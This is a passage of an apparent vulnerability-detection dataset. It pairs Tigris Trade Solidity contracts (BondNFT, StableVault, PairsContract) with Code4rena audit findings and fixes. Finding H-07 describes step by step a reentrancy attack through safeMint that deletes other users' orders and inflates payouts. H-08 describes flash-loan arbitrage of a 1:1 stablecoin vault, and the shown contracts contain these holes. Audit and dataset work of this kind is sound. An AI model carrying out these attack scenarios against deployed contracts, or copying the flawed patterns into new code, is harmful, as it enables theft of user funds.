require(bond.owner == _sender, \"!owner\");\n        require(!bond.expired, \"Expired\");\n        require(bond.asset == _asset, \"!BondAsset\");\n        require(bond.pending == 0);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(bond.period+_period <= 365, \"MAX PERIOD\");\n        unchecked {\n            uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n            uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n            totalShares[bond.asset] += shares-bond.shares;\n            _bond.shares = shares;\n            _bond.amount += _amount;\n            _bond.expireEpoch = expireEpoch;\n            _bond.period += _period;\n            _bond.mintTime = block.timestamp;\n            _bond.mintEpoch = epoch[bond.asset];\n            bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n        }\n        emit ExtendLock(_period, _amount, _sender,  _id);\n    }\n\n    /**\n     * @notice Release a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _releaser address initiating the release of the bond\n     * @return amount amount of tigAsset returned\n     * @return lockAmount amount of tigAsset locked in the bond\n     * @return asset tigAsset token released\n     * @return _owner bond owner\n     */\n    function release(\n        uint _id,\n        address _releaser\n    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n        Bond memory bond = idToBond(_id);\n        require(bond.expired, \"!expire\");\n        if (_releaser != bond.owner) {\n            unchecked {\n                require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n            }\n        }\n        amount = bond.amount;\n        unchecked {\n            totalShares[bond.asset] -= bond.shares;\n            (uint256 _claimAmount,) = claim(_id, bond.owner);\n            amount += _claimAmount;\n        }\n        asset = bond.asset;\n        lockAmount = bond.amount;\n        _owner = bond.owner;\n        _burn(_id);\n        emit Release(asset, lockAmount, _owner, _id);\n    }\n    /**\n     * @notice Claim rewards from a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond to claim rewards from\n     * @param _claimer address claiming rewards\n     * @return amount amount of tigAsset claimed\n     * @return tigAsset tigAsset token address\n     */\n    function claim(\n        uint _id,\n        address _claimer\n    ) public onlyManager() returns(uint amount, address tigAsset) {\n        Bond memory bond = idToBond(_id);\n        require(_claimer == bond.owner, \"!owner\");\n        amount = bond.pending;\n        tigAsset = bond.asset;\n        unchecked {\n            if (bond.expired) {\n                uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n                if (totalShares[bond.asset] > 0) {\n                    accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n                }\n            }\n            bondPaid[_id][bond.asset] += amount;\n        }\n        IERC20(tigAsset).transfer(manager, amount);\n        emit ClaimFees(tigAsset, amount, _claimer, _id);\n    }\n\n    /**\n     * @notice Claim user debt left from bond transfer\n     * @dev Should only be called by a manager contract\n     * @param _user user address\n     * @param _tigAsset tigAsset token address\n     * @return amount amount of tigAsset claimed\n     */\n    function claimDebt(\n        address _user,\n        address _tigAsset\n    ) public onlyManager() returns(uint amount) {\n        amount = userDebt[_user][_tigAsset];\n        userDebt[_user][_tigAsset] = 0;\n        IERC20(_tigAsset).transfer(manager, amount);\n        emit ClaimDebt(_tigAsset, amount, _user);\n    }\n\n    /**\n     * @notice Distribute rewards to bonds\n     * @param _tigAsset tigAsset token address\n     * @param _amount tigAsset amount\n     */\n    function distribute(\n        address _tigAsset,\n        uint _amount\n    ) external {\n        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n        unchecked {\n            uint aEpoch = block.timestamp / DAY;\n            if (aEpoch > epoch[_tigAsset]) {\n                for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                    epoch[_tigAsset] += 1;\n                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                }\n            }\n            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n        }\n        emit Distribution(_tigAsset, _amount);\n    }\n\n    /**\n     * @notice Get all data for a bond\n     * @param _id ID of the bond\n     * @return bond Bond object\n     */\n    function idToBond(uint256 _id) public view returns (Bond memory bond) {\n        bond = _idToBond[_id];\n        bond.owner = ownerOf(_id);\n        bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n        unchecked {\n            uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n            bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n        }\n    }\n\n    /*\n     * @notice Get expired boolean for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function isExpired(uint256 _id) public view returns (bool) {\n        Bond memory bond = _idToBond[_id];\n        return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n    }\n\n    /*\n     * @notice Get pending rewards for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function pending(\n        uint256 _id\n    ) public view returns (uint256) {\n        return idToBond(_id).pending;\n    }\n\n    function totalAssets() public view returns (uint256) {\n        return assets.length;\n    }\n\n    /*\n     * @notice Gets an array of all whitelisted token addresses\n     * @return address array of addresses\n     */\n    function getAssets() public view returns (address[] memory) {\n        return assets;\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function safeTransferMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _transfer(_msgSender(), _to, _ids[i]);\n            }\n        }\n    }\n\n    function safeTransferFromMany(address _from, address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                safeTransferFrom(_from, _to, _ids[i]);\n            }\n        }\n    }\n\n    function approveMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                approve(_to, _ids[i]);\n            }\n        }\n    }\n\n    function _mint(\n        address to,\n        Bond memory bond\n    ) internal {\n        unchecked {\n            bondPaid[bond.id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * bond.shares / 1e18;\n        }\n        _mint(to, bond.id);\n    }\n\n    function _burn(\n        uint256 _id\n    ) internal override {\n        delete _idToBond[_id];\n        super._burn(_id);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 _id\n    ) internal override {\n        Bond memory bond = idToBond(_id);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(!bond.expired, \"Expired!\");\n        unchecked {\n            require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n            userDebt[from][bond.asset] += bond.pending;\n            bondPaid[_id][bond.asset] += bond.pending;\n        }\n        super._transfer(from, to, _id);\n    }\n\n    function balanceIds(address _user) public view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _ids[i] = tokenOfOwnerByIndex(_user, i);\n            }\n        }\n        return _ids;\n    }\n\n    function addAsset(address _asset) external onlyOwner {\n        require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n        assetsIndex[_asset] = assets.length;\n        assets.push(_asset);\n        allowedAsset[_asset] = true;\n        epoch[_asset] = block.timestamp/DAY;\n    }\n\n    function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n        require(assets[assetsIndex[_asset]] == _asset, \"Not added\");\n        allowedAsset[_asset] = _bool;\n    }\n\n    function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    function setManager(\n        address _manager\n    ) public onlyOwner() {\n        manager = _manager;\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == manager, \"!manager\");\n        _;\n    }\n\n    event Distribution(address _tigAsset, uint256 _amount);\n    event Lock(address _tigAsset, uint256 _amount, uint256 _period, address _owner, uint256 _id);\n    event ExtendLock(uint256 _period, uint256 _amount, address _owner, uint256 _id);\n    event Release(address _tigAsset, uint256 _amount, address _owner, uint256 _id);\n    event ClaimFees(address _tigAsset, uint256 _amount, address _claimer, uint256 _id);\n    event ClaimDebt(address _tigAsset, uint256 _amount, address _owner);\n}\n\n",
        "CodeNames": [
            "Position.sol",
            "Trading.sol",
            "BondNFT.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-07",
                "Location": [
                    "burn()",
                    "initiateMarketOrder()",
                    "_safeMint()",
                    "addToPosition(ID",
                    "initiateMarketOrder(lowMargin)",
                    "_tokenIds",
                    "checkDelay()",
                    "cancelLimitOrder()",
                    "_limitOrders",
                    "_payout",
                    "trades()",
                    "burn(ID",
                    "initId",
                    "accInterest",
                    "pnl()",
                    "cancelLimitOrder(ID",
                    "_checkDelay()",
                    "safeMint()",
                    "_openPositions",
                    "newMargin",
                    "initiateLimitOrder()",
                    "mint()"
                ],
                "Type": " reentrancy attack during  mint()  function in Position contract which can lead to removing of the other user's limit orders or stealing contract funds because initId is set low value",
                "Description": "*Submitted by unforgiven(https://github.com/code-423n4/2022-12-tigris-findings/issues/400), also found by wait(https://github.com/code-423n4/2022-12-tigris-findings/issues/539), rotcivegaf(https://github.com/code-423n4/2022-12-tigris-findings/issues/489), 0xsomeone(https://github.com/code-423n4/2022-12-tigris-findings/issues/459), hihen(https://github.com/code-423n4/2022-12-tigris-findings/issues/451), KingNFT(https://github.com/code-423n4/2022-12-tigris-findings/issues/357), mookimgo(https://github.com/code-423n4/2022-12-tigris-findings/issues/288), debo(https://github.com/code-423n4/2022-12-tigris-findings/issues/186), and stealthyz(https://github.com/code-423n4/2022-12-tigris-findings/issues/90)*\n\nFunction Position.mint() has been used in initiateLimitOrder() and initiateMarketOrder() and it doesn't follow check-effect-interaction pattern and code updates the values of _limitOrders, initId, _openPositions and position _tokenIds variables after making external call by using safeMint(). This would give the attacker opportunity to reenter the Trading contract logics and perform malicious actions while the contract storage state is wrong. The only limitation of the attacker is that he needs to bypass _checkDelay() checks. Attacker can perform this action:\n\n1.  Call initiateLimitOrder() and create limit order with id equal to ID1 reenter (while _limitOrders for ID1 is not yet settled) with cancelLimitOrder(ID1) (no checkDelay() check) and remove other users limit orders because code would try to remove _limitOrderIndexes[_asset][ID1] position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the Position.burn() code.\n2.  Call initiateMarketOrder() and create a position with ID1 and while initId[ID1] has not yet settled reenter the Trading with addToPosition(ID1) function (bypass checkDelay() because both action is opening) and increase the position size which would set initId[ID1] according to new position values but then when code execution returns to rest of mint() logic initId[ID1] would set by initial values of the positions which is very lower than what it should be and initId[ID1] has been used for calculating accuredInterest of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.\n\n\nThis is mint() code in Position contract:\n\n        function mint(\n            MintTrade memory _mintTrade\n        ) external onlyMinter {\n            uint newTokenID = _tokenIds.current();\n\n            Trade storage newTrade = _trades[newTokenID];\n            newTrade.margin = _mintTrade.margin;\n            newTrade.leverage = _mintTrade.leverage;\n            newTrade.asset = _mintTrade.asset;\n            newTrade.direction = _mintTrade.direction;\n            newTrade.price = _mintTrade.price;\n            newTrade.tpPrice = _mintTrade.tp;\n            newTrade.slPrice = _mintTrade.sl;\n            newTrade.orderType = _mintTrade.orderType;\n            newTrade.id = newTokenID;\n            newTrade.tigAsset = _mintTrade.tigAsset;\n\n            _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage\n            if (_mintTrade.orderType  0) { // update the values of some storage functions\n                _limitOrders[_mintTrade.asset].push(newTokenID);\n                _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n            } else {\n                initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n                _openPositions.push(newTokenID);\n                _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n                _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n                _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n            }\n            _tokenIds.increment();\n        }\n\nAs you can see by calling _safeMint(), code would make external call to onERC721Received() function of the account address and the code sets the values for _limitOrders[], _limitOrderIndexes[], initId[], _openPositions[], _openPositionsIndexes[], _assetOpenPositions[], _assetOpenPositionsIndexes[] and _tokenIds. So code doesn't follow check-effect-interaction pattern and it's possible to perform reentrancy attack.\n\nThere could be multiple scenarios that the attacker can perform the attack and do some damage. Two of them are:\n\nScenario #1 where attacker removes other users limit orders and create broken storage state\n\n1.  Attacker contract would call initiateLimitOrder() and code would create the limit order and mint it in the Position._safeMint() with ID1.\n2.  Then code would call attacker address in _safeMint() function because of the onERC721Received() call check.\n3.  Variables _limitOrders[], _limitOrderIndexes[ID1] are not yet updated for ID1 and _limitOrderIndexes[ID1] is 0x0 and ID1 is not in _limitOrder[] list.\n4.  Attacker contract would reenter the Trading contract by calling cancelLimitOrder(ID1).\n5.  cancelLimitOrder() checks would pass and would try to call Position.burn(ID1).\n6.  burn() function would try to remove ID1 from _limitOrders[] list but because _limitOrderIndexes[ID1] is 0, the code would remove the 0 index limit order which belongs to another user.\n7.  Execution would return to Position.mint() logic and code would add burned id token to _limitOrder[] list.\n\nSo there are two impacts here.  First, other users limit orders get removed.  The second is that contract storage had a bad state and burned tokens get stock in the list.\n\nScenario #2 where attacker steal contract/users funds by wrong profit calculation\n\n1.  Attacker's contract would call initiateMarketOrder(lowMargin) to create position with ID1 while the margin is low.\n2.  Code would mint position token for attacker and in _safeMint() would make external call and call onERC721Received() function of attacker address.\n3.  The value of initId[ID1] is not yet set for ID1.\n4.  Attacker contract would call addToPosition(ID1, bigMargin) to increase the margin of the position the _checkDelay() check would pass because both actions are opening position.\n5.  Code would increase the margin of the position and set the value of the initId[ID1] by calling position.addToPosition() and the value would be based on the newMargin.\n6.  The execution flow would receive the rest of Position.mint() function and code would set initId[ID1] based on old margin value.\n7.  Then the value of initId[ID1] for attacker position would be very low, which would cause accInterest to be higher than it's supposed to be for position(in Position.trades() function calculations ) and would cause _payout value to be very high (in pnl() function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.\n\nSo attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.\n\nThere can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.\n\n\nVIM\n\n",
                "Repair": "\nFollow the check-effect-interaction pattern.\n\nTriHaz (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/400)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1383811250):\n In contrast to other CEI reports, this report shows how control can be gained in the middle of the mint execution to create an inconsistent state.\n\n The warden has shown how, because mint doesn't follow CEI conventions, by reEntering via safeMint, an attacker can manipulate the state of limit orders, and also benefit by changing profit calculations.\n \n Because the finding shows how to break invariants and profit from it, I agree with High Severity.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1407764413):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175911 \n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/IStableVault.sol\";\n\ninterface IERC20Mintable is IERC20 {\n    function mintFor(address, uint256) external;\n    function burnFrom(address, uint256) external;\n    function decimals() external view returns (uint);\n}\n\ninterface ERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract StableVault is MetaContext, IStableVault {\n\n    mapping(address => bool) public allowed;\n    mapping(address => uint) private tokenIndex;\n    address[] public tokens;\n\n    address public immutable stable;\n\n    constructor(address _stable) {\n        stable = _stable;\n    }\n\n    /**\n    * @notice deposit an allowed token and receive tigAsset\n    * @param _token address of the allowed token\n    * @param _amount amount of _token\n    */\n    function deposit(address _token, uint256 _amount) public {\n        require(allowed[_token], \"Token not listed\");\n        IERC20(_token).transferFrom(_msgSender(), address(this), _amount);\n        IERC20Mintable(stable).mintFor(\n            _msgSender(),\n            _amount*(10**(18-IERC20Mintable(_token).decimals()))\n        );\n    }\n\n    function depositWithPermit(address _token, uint256 _amount, uint256 _deadline, bool _permitMax, uint8 v, bytes32 r, bytes32 s) external {\n        uint _toAllow = _amount;\n        if (_permitMax) _toAllow = type(uint).max;\n        ERC20Permit(_token).permit(_msgSender(), address(this), _toAllow, _deadline, v, r, s);\n        deposit(_token, _amount);\n    }\n\n    /**\n    * @notice swap tigAsset to _token\n    * @param _token address of the token to receive\n    * @param _amount amount of _token\n    */\n    function withdraw(address _token, uint256 _amount) external returns (uint256 _output) {\n        IERC20Mintable(stable).burnFrom(_msgSender(), _amount);\n        _output = _amount/10**(18-IERC20Mintable(_token).decimals());\n        IERC20(_token).transfer(\n            _msgSender(),\n            _output\n        );\n    }\n\n    /**\n    * @notice allow a token to be used in vault\n    * @param _token address of the token\n    */\n    function listToken(address _token) external onlyOwner {\n        require(!allowed[_token], \"Already added\");\n        tokenIndex[_token] = tokens.length;\n        tokens.push(_token);\n        allowed[_token] = true;\n    }\n\n    /**\n    * @notice stop a token from being allowed in vault\n    * @param _token address of the token\n    */\n    function delistToken(address _token) external onlyOwner {\n        require(allowed[_token], \"Not added\");\n        tokenIndex[tokens[tokens.length-1]] = tokenIndex[_token];\n        tokens[tokenIndex[_token]] = tokens[tokens.length-1];\n        delete tokenIndex[_token];\n        tokens.pop();\n        allowed[_token] = false;\n    }\n}\n\n",
        "CodeNames": [
            "StableVault.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-08",
                "Location": [
                    "withdraw",
                    "deposit"
                ],
                "Type": " Incorrect Assumption of Stablecoin Market Stability",
                "Description": "*Submitted by 0xsomeone(https://github.com/code-423n4/2022-12-tigris-findings/issues/462), also found by Critical(https://github.com/code-423n4/2022-12-tigris-findings/issues/496), __141345__(https://github.com/code-423n4/2022-12-tigris-findings/issues/397), Tointer(https://github.com/code-423n4/2022-12-tigris-findings/issues/384), Secureverse(https://github.com/code-423n4/2022-12-tigris-findings/issues/243), SamGMK(https://github.com/code-423n4/2022-12-tigris-findings/issues/227), rotcivegaf(https://github.com/code-423n4/2022-12-tigris-findings/issues/214), 0xhacksmithh(https://github.com/code-423n4/2022-12-tigris-findings/issues/210), 8olidity(https://github.com/code-423n4/2022-12-tigris-findings/issues/203), Ruhum(https://github.com/code-423n4/2022-12-tigris-findings/issues/155), and aviggiano(https://github.com/code-423n4/2022-12-tigris-findings/issues/151)*\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51 \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72\n\n\nThe StableVault contract attempts to group all types of stablecoins under a single token which can be minted for any of the stablecoins supported by the system as well as burned for any of them.\n\nThis is at minimum a medium-severity vulnerability as the balance sheet of the StableVault will consist of multiple assets which do not have a one-to-one exchange ratio between them as can be observed by trading pools such as Curve(https://curve.fi/#/ethereum/pools/3pool/deposit) as well as the Chainlink oracle reported prices themselves(https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd).\n\nGiven that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices, the balance sheet of the contract can be arbitraged (especially by flash-loans) to swap an undesirable asset (i.e. USDC which at the time of submission was valued at 0.99994853 USD) for a more desirable asset (i.e. USDT which at the time of submission was valued at 1.00000000 USD) acquiring an arbitrage in the price by selling the traded asset.\n\n\nTo illustrate the issue, simply view the exchange output you would get for swapping your USDC to USDT in a stablecoin pool (i.e. CurveFi) and then proceed to invoke deposit(https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51) with your USDC asset and retrieve your incorrectly calculated USDT equivalent via withdraw(https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72).\n\nThe arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling our newly acquired USDT for USDC on the stablecoin pair we assessed earlier, ultimately ending up with a greater amount of USDC than we started with. This type of attack can be extrapolated by utilizing a flash-loan rather than our personal funds.\n\n\nChainlink oracle resources(https://data.chain.link/popular)\n\nCurve Finance pools(https://curve.fi/#/ethereum/pools)\n\n",
                "Repair": "\nWe advise the StableVault to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their \"neutral\" USD price rather than their subjective on-chain price or equality assumption.\n\nAlex the Entreprenerd (judge) increased severity to High and commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1359639245):\n  The warden has shown how, due to an incorrect assumption, the system offers infinite leverage.\n \n This can be trivially exploited by arbitraging with any already available exchange.\n \n Depositors will incur a loss equal to the size of the arbitrage as the contract is always taking the losing side.\n \n I believe this should be High because of it's consistently losing nature.\n\nTriHaz (Tigris Trade) acknowledged and commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1377373227):\n  We are aware of this issue, we will keep the vault with one token for now.\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"./interfaces/IPairsContract.sol\";\nimport \"./interfaces/IPosition.sol\";\n\ncontract PairsContract is Ownable, IPairsContract {\n\n    address public protocol;\n\n    mapping(uint256 => bool) public allowedAsset;\n\n    uint256 private maxBaseFundingRate = 1e10;\n\n    mapping(uint256 => Asset) private _idToAsset;\n    function idToAsset(uint256 _asset) public view returns (Asset memory) {\n        return _idToAsset[_asset];\n    }\n\n    mapping(uint256 => mapping(address => OpenInterest)) private _idToOi;\n    function idToOi(uint256 _asset, address _tigAsset) public view returns (OpenInterest memory) {\n        return _idToOi[_asset][_tigAsset];\n    }\n\n    // OWNER\n\n    /**\n     * @dev Update the Chainlink price feed of an asset\n     * @param _asset index of the requested asset\n     * @param _feed contract address of the Chainlink price feed\n     */\n    function setAssetChainlinkFeed(uint256 _asset, address _feed) external onlyOwner {\n        bytes memory _name  = bytes(_idToAsset[_asset].name);\n        require(_name.length > 0, \"!Asset\");\n        _idToAsset[_asset].chainlinkFeed = _feed;\n    }\n\n    /**\n     * @dev Add an allowed asset to fetch prices for\n     * @param _asset index of the requested asset\n     * @param _name name of the asset\n     * @param _chainlinkFeed optional address of the respective Chainlink price feed\n     * @param _maxLeverage maximimum allowed leverage\n     * @param _maxLeverage minimum allowed leverage\n     * @param _feeMultiplier percent value that the opening/closing fee is multiplied by in BP\n     */\n    function addAsset(uint256 _asset, string memory _name, address _chainlinkFeed, uint256 _minLeverage, uint256 _maxLeverage, uint256 _feeMultiplier, uint256 _baseFundingRate) external onlyOwner {\n        bytes memory _assetName  = bytes(_idToAsset[_asset].name);\n        require(_assetName.length == 0, \"Already exists\");\n        require(bytes(_name).length > 0, \"No name\");\n        require(_maxLeverage >= _minLeverage && _minLeverage > 0, \"Wrong leverage values\");\n\n        allowedAsset[_asset] = true;\n        _idToAsset[_asset].name = _name;\n\n        _idToAsset[_asset].chainlinkFeed = _chainlinkFeed;\n\n        _idToAsset[_asset].minLeverage = _minLeverage;\n        _idToAsset[_asset].maxLeverage = _maxLeverage;\n        _idToAsset[_asset].feeMultiplier = _feeMultiplier;\n        _idToAsset[_asset].baseFundingRate = _baseFundingRate;\n\n        emit AssetAdded(_asset, _name);\n    }\n\n    /**\n     * @dev Update the leverage allowed per asset\n     * @param _asset index of the asset\n     * @param _minLeverage minimum leverage allowed\n     * @param _maxLeverage Maximum leverage allowed\n     */\n    function updateAssetLeverage(uint256 _asset, uint256 _minLeverage, uint256 _maxLeverage) external onlyOwner {\n        bytes memory _name  = bytes(_idToAsset[_asset].name);\n        require(_name.length > 0, \"!Asset\");\n\n        if (_maxLeverage > 0) {\n            _idToAsset[_asset].maxLeverage = _maxLeverage;\n        }\n        if (_minLeverage > 0) {\n            _idToAsset[_asset].minLeverage = _minLeverage;\n        }\n        \n        require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n    }\n\n    /**\n     * @notice update the base rate for funding fees per asset\n     * @param _asset index of the asset\n     * @param _baseFundingRate the rate to set\n     */\n    function setAssetBaseFundingRate(uint256 _asset, uint256 _baseFundingRate) external onlyOwner {\n        bytes memory _name  = bytes(_idToAsset[_asset].name);\n        require(_name.length > 0, \"!Asset\");\n        require(_baseFundingRate <= maxBaseFundingRate, \"baseFundingRate too high\");\n        _idToAsset[_asset].baseFundingRate = _baseFundingRate;\n    }\n\n    /**\n     * @notice update the fee multiplier per asset\n     * @param _asset index of the asset\n     * @param _feeMultiplier the fee multiplier\n     */\n    function updateAssetFeeMultiplier(uint256 _asset, uint256 _feeMultiplier) external onlyOwner {\n        bytes memory _name  = bytes(_idToAsset[_asset].name);\n        require(_name.length > 0, \"!Asset\");\n        _idToAsset[_asset].feeMultiplier = _feeMultiplier;\n    }\n\n     /**\n     * @notice pause an asset from being traded\n     * @param _asset index of the asset\n     * @param _isPaused paused if true\n     */\n    function pauseAsset(uint256 _asset, bool _isPaused) external onlyOwner {\n        bytes memory _name  = bytes(_idToAsset[_asset].name);\n        require(_name.length > 0, \"!Asset\");\n        allowedAsset[_asset] = !_isPaused;\n    }\n\n    /**\n     * @notice sets the max rate for funding fees\n     * @param _maxBaseFundingRate max base funding rate\n     */\n    function setMaxBaseFundingRate(uint256 _maxBaseFundingRate) external onlyOwner {\n        maxBaseFundingRate = _maxBaseFundingRate;\n    }\n\n    function setProtocol(address _protocol) external onlyOwner {\n        protocol = _protocol;\n    }\n\n    /**\n     * @dev Update max open interest limits\n     * @param _asset index of the asset\n     * @param _tigAsset contract address of the tigAsset\n     * @param _maxOi Maximum open interest value per side\n     */\n    function setMaxOi(uint256 _asset, address _tigAsset, uint256 _maxOi) external onlyOwner {\n        bytes memory _name  = bytes(_idToAsset[_asset].name);\n        require(_name.length > 0, \"!Asset\");\n        _idToOi[_asset][_tigAsset].maxOi = _maxOi;\n    }\n\n    // Protocol-only\n\n    /**\n     * @dev edits the current open interest for long\n     * @param _asset index of the asset\n     * @param _tigAsset contract address of the tigAsset\n     * @param _onOpen true if adding to open interesr\n     * @param _amount amount to be added/removed from open interest\n     */\n    function modifyLongOi(uint256 _asset, address _tigAsset, bool _onOpen, uint256 _amount) external onlyProtocol {\n        if (_onOpen) {\n            _idToOi[_asset][_tigAsset].longOi += _amount;\n            require(_idToOi[_asset][_tigAsset].longOi <= _idToOi[_asset][_tigAsset].maxOi || _idToOi[_asset][_tigAsset].maxOi == 0, \"MaxLongOi\");\n        }\n        else {\n            _idToOi[_asset][_tigAsset].longOi -= _amount;\n            if (_idToOi[_asset][_tigAsset].longOi < 1e9) {\n                _idToOi[_asset][_tigAsset].longOi = 0;\n            }\n        }\n    }\n\n     /**\n     * @dev edits the current open interest for short\n     * @param _asset index of the asset\n     * @param _tigAsset contract address of the tigAsset\n     * @param _onOpen true if adding to open interesr\n     * @param _amount amount to be added/removed from open interest\n     */\n    function modifyShortOi(uint256 _asset, address _tigAsset, bool _onOpen, uint256 _amount) external onlyProtocol {\n        if (_onOpen) {\n            _idToOi[_asset][_tigAsset].shortOi += _amount;\n            require(_idToOi[_asset][_tigAsset].shortOi <= _idToOi[_asset][_tigAsset].maxOi || _idToOi[_asset][_tigAsset].maxOi == 0, \"MaxShortOi\");\n            }\n        else {\n            _idToOi[_asset][_tigAsset].shortOi -= _amount;\n            if (_idToOi[_asset][_tigAsset].shortOi < 1e9) {\n                _idToOi[_asset][_tigAsset].shortOi = 0;\n            }\n        }\n    }\n\n    // Modifiers\n\n    modifier onlyProtocol() {\n        require(_msgSender() == address(protocol), \"!Protocol\");\n        _;\n    }\n\n    // EVENTS\n\n    event AssetAdded(\n        uint _asset,\n        string _name\n    );\n\n}\n\n//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/ITrading.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./interfaces/IPairsContract.sol\";\nimport \"./interfaces/IReferrals.sol\";\nimport \"./interfaces/IPosition.sol\";\nimport \"./interfaces/IGovNFT.sol\";\nimport \"./interfaces/IStableVault.sol\";\nimport \"./utils/TradingLibrary.sol\";\n\ninterface ITradingExtension {\n    function getVerifiedPrice(\n        uint _asset,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        uint _withSpreadIsLong\n    ) external returns(uint256 _price, uint256 _spread);\n    function getRef(\n        address _trader\n    ) external pure returns(address);\n    function _setReferral(\n        bytes32 _referral,\n        address _trader\n    ) external;\n    function validateTrade(uint _asset, address _tigAsset, uint _margin, uint _leverage) external view;\n    function isPaused() external view returns(bool);\n    function minPos(address) external view returns(uint);\n    function modifyLongOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function modifyShortOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function paused() external returns(bool);\n    function _limitClose(\n        uint _id,\n        bool _tp,\n        